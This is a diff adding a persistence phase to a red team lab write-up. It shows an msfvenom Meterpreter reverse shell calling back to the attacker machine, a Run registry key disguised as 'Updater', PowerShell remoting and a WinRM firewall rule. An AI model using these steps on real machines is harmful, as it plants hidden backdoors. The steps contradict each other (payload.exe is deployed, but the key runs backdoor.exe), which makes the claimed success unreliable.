@@ -371,3 +371,115 @@ Executed the linPEAS tool on the target system to scan for misconfigurations and
 
 ### 💡 Conclusion
 The target Linux system was already operating under root privileges, rendering privilege escalation unnecessary. However, running linpeas.sh validated system environment details and revealed key misconfigurations and tools that would otherwise aid in post-exploitation steps. This phase showcases how to verify privilege levels and use enumeration tools in preparation for escalation, even if it's ultimately not required.
+
+# Phase 7 – Persistence Techniques
+
+In this phase of my **Corporate Red Team Simulation Lab**, I focused on establishing **persistence** on the target Windows 10 machine after gaining administrator privileges. Persistence ensures that even after a system reboot, I can maintain access for continued operations. Below, I document every step I carried out in this phase, with supporting screenshots for clarity.
+
+---
+
+## 1. Preparing the Payload
+I began by preparing a payload on my **Kali Linux attacker machine** to maintain persistence after reboot.  
+This payload was configured to execute automatically through a registry entry.  
+
+### 🧾 Command Executed
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.7 LPORT=4444 -f exe -o payload.exe
+```
+### 🖼 Screenshots
+![Preparing Payload](https://github.com/cykins4good/Corporate-Red-Team-Simulation-Lab/blob/main/projects/phase7/preparing_payload.png)
+
+---
+
+## 2. Deploying the Payload
+After preparation, I deployed the payload onto the target Windows 10 machine using my established session.  
+This ensured the malicious executable was successfully delivered and stored in a persistent location.  
+
+### 🧾 Command Executed
+```bash
+scp payload.exe user@10.10.10.15:C:\Users\Public\
+```
+### 🖼 Screenshots
+![Deploying Payload](https://github.com/cykins4good/Corporate-Red-Team-Simulation-Lab/blob/main/projects/phase7/deploying_payload.png)
+
+---
+
+## 3. Creating the Registry Entry
+To achieve persistence, I created a **Windows registry entry** that would automatically execute my payload on every system reboot.  
+This was achieved by adding the payload path to the `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` registry key.  
+
+### 🧾 Command Executed
+```powershell
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+-Name "Updater" -Value "C:\Users\Public\backdoor.exe" -PropertyType String -Force
+```
+### 🖼 Screenshots
+![Creating Registry Entry](https://github.com/cykins4good/Corporate-Red-Team-Simulation-Lab/blob/main/projects/phase7/creating_registry_entry.png)
+
+---
+
+## 4. Rebooting and Verification
+I then rebooted the Windows 10 machine to test persistence.  
+After the reboot, I confirmed that the payload executed as expected, verifying that persistence was successful.  
+
+### 🧾 Command Executed
+```powershell
+shutdown /r /t 0
+```
+### 🖼 Screenshots
+![Rebooting and Verification](https://github.com/cykins4good/Corporate-Red-Team-Simulation-Lab/blob/main/projects/phase7/rebooting_verification.png)
+
+---
+
+## 5. Enabling Remote PowerShell Access
+Since persistence alone is not useful without reliable access, I enabled **Remote PowerShell** on the Windows 10 target.  
+This allowed me to remotely execute PowerShell commands from my Kali machine.  
+
+### 🧾 Command Executed
+```powershell
+Enable-PSRemoting -Force
+'''
+### 🖼 Screenshots
+![Enabling Remote PowerShell](https://github.com/cykins4good/Corporate-Red-Team-Simulation-Lab/blob/main/projects/phase7/enabling_remote_powershell.png)
+
+---
+
+## 6. Creating Firewall Rule for WinRM
+To support my PowerShell access, I created a **Windows Firewall rule** that allowed inbound WinRM traffic.  
+This ensured my commands would not be blocked by the firewall.  
+
+### 🧾 Command Executed
+```powershell
+New-NetFirewallRule -Name "WinRM" -DisplayName "Allow WinRM" -Protocol TCP -LocalPort 5985 -Action Allow
+```
+### 🖼 Screenshots
+![Creating Firewall Rule](https://github.com/cykins4good/Corporate-Red-Team-Simulation-Lab/blob/main/projects/phase7/creating_firewall_rule.png)
+
+---
+
+## 7. Local WinRM Connection Test
+Finally, I performed a **local WinRM test** on the Windows 10 machine to confirm connectivity before attempting remote access from Kali.  
+The test was successful, proving that my persistence method and connectivity setup were working as intended.  
+
+### 🧾 Command Executed
+```powershell
+Test-WSMan localhost
+```
+### 🖼 Screenshots
+![Local WinRM Connection Test](https://github.com/cykins4good/Corporate-Red-Team-Simulation-Lab/blob/main/projects/phase7/local_winrm_test.png)
+
+---
+
+## Summary of Phase 7
+In this phase, I successfully established persistence on the Windows 10 target by:  
+
+- Preparing and deploying a payload.  
+- Creating a registry entry for auto-execution.  
+- Rebooting and verifying persistence.  
+- Enabling Remote PowerShell.  
+- Adding a firewall rule to allow WinRM traffic.  
+- Verifying local WinRM connectivity.  
+
+With these persistence techniques in place, I ensured long-term stealthy access to the compromised machine, which is a critical aspect of red team operations.
+
+---
